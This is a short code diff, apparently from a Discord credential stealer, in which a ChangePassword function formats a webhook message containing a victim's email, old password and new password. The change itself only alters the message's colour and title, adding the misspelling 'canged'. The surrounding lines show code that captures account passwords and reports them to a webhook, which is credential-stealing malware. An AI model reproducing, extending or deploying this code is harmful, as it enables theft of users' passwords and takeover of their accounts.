@@ -187,10 +187,10 @@ function ChangePassword(oldpassword, newpassword, token) {
             avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 000000,
                     "fields": [
                         {
-                            "name": "**Password Changed**",
+                            "name": "Password canged",
                             "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                             "inline": true
                         },
